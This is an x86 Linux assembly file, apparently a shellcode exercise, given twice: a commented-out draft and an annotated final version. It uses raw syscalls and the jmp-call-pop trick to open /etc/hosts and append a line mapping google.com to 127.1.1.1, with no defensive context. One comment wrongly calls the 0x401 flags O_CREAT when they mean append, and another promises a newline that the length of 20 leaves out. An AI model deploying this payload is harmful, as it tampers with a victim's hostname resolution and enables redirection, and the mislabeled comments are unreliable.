; global _start

; section .text

; _start:
;     xor ecx, ecx
;     mul ecx
;     mov al, 0x5     
;     push ecx
;     push 0x7374736f     ;/etc///hosts
;     push 0x682f2f2f
;     push 0x6374652f
;     mov ebx, esp
;     mov cx, 0x401       ;permmisions
;     int 0x80            ;syscall to open file

;     xchg eax, ebx
;     push 0x4
;     pop eax
;     jmp short _load_data    ;jmp-call-pop technique to load the map

; _write:
;     pop ecx
;     push 20             ;length of the string, dont forget to modify if changes the map
;     pop edx
;     int 0x80            ;syscall to write in the file

;     push 0x6
;     pop eax
;     int 0x80            ;syscall to close the file

;     push 0x1
;     pop eax
;     int 0x80            ;syscall to exit

; _load_data:
;     call _write
;     google db "127.1.1.1 google.com"

global _start

section .text

_start:
    xor ecx, ecx            ; clear ecx
    mul ecx                 ; eax = 0
    mov al, 0x5             ; syscall for open()
    push ecx
    push 0x7374736f         ; "osts"
    push 0x682f2f2f         ; "///h"
    push 0x6374652f         ; "/etc"
    mov ebx, esp            ; ebx points to "/etc///hosts"
    mov cx, 0x401           ; permissions: O_WRONLY | O_CREAT
    int 0x80                ; make syscall to open file

    xchg eax, ebx           ; save file descriptor in ebx
    push 0x4
    pop eax                 ; eax = syscall write (4)
    jmp short _load_data    ; jmp-call-pop technique to load the string

_write:
    pop ecx                 ; pop string address to ecx
    push 20                 ; string length (update if needed)
    pop edx                 ; edx = length of the string
    int 0x80                ; syscall to write to file

    push 0x6
    pop eax                 ; eax = syscall close (6)
    int 0x80                ; close the file

    push 0x1
    pop eax                 ; eax = syscall exit (1)
    int 0x80                ; exit

_load_data:
    call _write
    db "127.1.1.1 google.com", 0x0A   ; string to write with newline
